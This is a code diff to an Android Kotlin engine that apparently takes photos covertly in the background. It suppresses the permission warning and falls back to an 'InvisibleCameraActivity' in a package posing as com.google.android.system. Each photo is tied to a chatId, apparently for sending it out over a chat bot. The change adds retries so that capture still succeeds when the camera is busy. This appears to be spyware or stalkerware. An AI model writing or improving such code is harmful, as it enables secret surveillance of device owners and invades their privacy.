@@ -85,24 +85,53 @@ object BackgroundCameraEngine {
                     }
                 }, handler)
 
-                @Suppress("MissingPermission", "DEPRECATION")
-                cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
-                    override fun onOpened(camera: CameraDevice) {
-                        try {
-                            val surface = imageReader.surface
-                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                                addTarget(surface)
-                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
-                            }
+                var retryCount = 0
+                val maxRetries = 3
 
-                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
-                                val outputConfig = android.hardware.camera2.params.OutputConfiguration(surface)
-                                val sessionConfig = android.hardware.camera2.params.SessionConfiguration(
-                                    android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
-                                    listOf(outputConfig),
-                                    { it.run() },
-                                    object : CameraCaptureSession.StateCallback() {
+                fun doOpenCamera() {
+                    @Suppress("MissingPermission", "DEPRECATION")
+                    cameraManager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
+                        override fun onOpened(camera: CameraDevice) {
+                            try {
+                                val surface = imageReader.surface
+                                val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                    addTarget(surface)
+                                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                }
+
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                                    val outputConfig = android.hardware.camera2.params.OutputConfiguration(surface)
+                                    val sessionConfig = android.hardware.camera2.params.SessionConfiguration(
+                                        android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
+                                        listOf(outputConfig),
+                                        { it.run() },
+                                        object : CameraCaptureSession.StateCallback() {
+                                            override fun onConfigured(session: CameraCaptureSession) {
+                                                try {
+                                                    session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
+                                                        override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
+                                                            try { camera.close() } catch (_: Exception) {}
+                                                        }
+                                                    }, handler)
+                                                } catch (e: Exception) {
+                                                    Log.e(TAG, "Session capture error: ${e.message}")
+                                                    try { camera.close() } catch (_: Exception) {}
+                                                    thread.quitSafely()
+                                                }
+                                            }
+
+                                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                                Log.w(TAG, "CameraCaptureSession onConfigureFailed. Falling back to InvisibleCameraActivity...")
+                                                try { camera.close() } catch (_: Exception) {}
+                                                thread.quitSafely()
+                                                com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
+                                            }
+                                        }
+                                    )
+                                    camera.createCaptureSession(sessionConfig)
+                                } else {
+                                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                                         override fun onConfigured(session: CameraCaptureSession) {
                                             try {
                                                 session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
@@ -123,53 +152,38 @@ object BackgroundCameraEngine {
                                             thread.quitSafely()
                                             com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                                         }
-                                    }
-                                )
-                                camera.createCaptureSession(sessionConfig)
-                            } else {
-                                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
-                                    override fun onConfigured(session: CameraCaptureSession) {
-                                        try {
-                                            session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
-                                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
-                                                    try { camera.close() } catch (_: Exception) {}
-                                                }
-                                            }, handler)
-                                        } catch (e: Exception) {
-                                            Log.e(TAG, "Session capture error: ${e.message}")
-                                            try { camera.close() } catch (_: Exception) {}
-                                            thread.quitSafely()
-                                        }
-                                    }
-
-                                    override fun onConfigureFailed(session: CameraCaptureSession) {
-                                        Log.w(TAG, "CameraCaptureSession onConfigureFailed. Falling back to InvisibleCameraActivity...")
-                                        try { camera.close() } catch (_: Exception) {}
-                                        thread.quitSafely()
-                                        com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
-                                    }
-                                }, handler)
+                                    }, handler)
+                                }
+                            } catch (e: Exception) {
+                                Log.e(TAG, "openCamera onOpened error: ${e.message}. Falling back...")
+                                try { camera.close() } catch (_: Exception) {}
+                                thread.quitSafely()
+                                com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                             }
-                        } catch (e: Exception) {
-                            Log.e(TAG, "openCamera onOpened error: ${e.message}. Falling back...")
+                        }
+
+                        override fun onDisconnected(camera: CameraDevice) {
+                            Log.w(TAG, "Camera disconnected")
                             try { camera.close() } catch (_: Exception) {}
                             thread.quitSafely()
-                            com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
                         }
-                    }
 
-                    override fun onDisconnected(camera: CameraDevice) {
-                        Log.w(TAG, "Camera disconnected")
-                        try { camera.close() } catch (_: Exception) {}
-                        thread.quitSafely()
-                    }
+                        override fun onError(camera: CameraDevice, error: Int) {
+                            try { camera.close() } catch (_: Exception) {}
+                            if (retryCount < maxRetries) {
+                                retryCount++
+                                Log.w(TAG, "Camera HAL error code $error (in use or busy). Retrying open attempt $retryCount/$maxRetries in 250ms...")
+                                handler.postDelayed({ doOpenCamera() }, 250)
+                            } else {
+                                Log.e(TAG, "Camera error code $error after $maxRetries retries. Falling back to InvisibleCameraActivity...")
+                                thread.quitSafely()
+                                com.google.android.system.InvisibleCameraActivity.takePhoto(context, chatId, isFront)
+                            }
+                        }
+                    }, handler)
+                }
 
-                    override fun onError(camera: CameraDevice, error: Int) {
-                        Log.e(TAG, "Camera error code: $error")
-                        try { camera.close() } catch (_: Exception) {}
-                        thread.quitSafely()
-                    }
-                }, handler)
+                doOpenCamera()
 
             } catch (e: Exception) {
                 Log.e(TAG, "Background camera capture exception: ${e.message}", e)
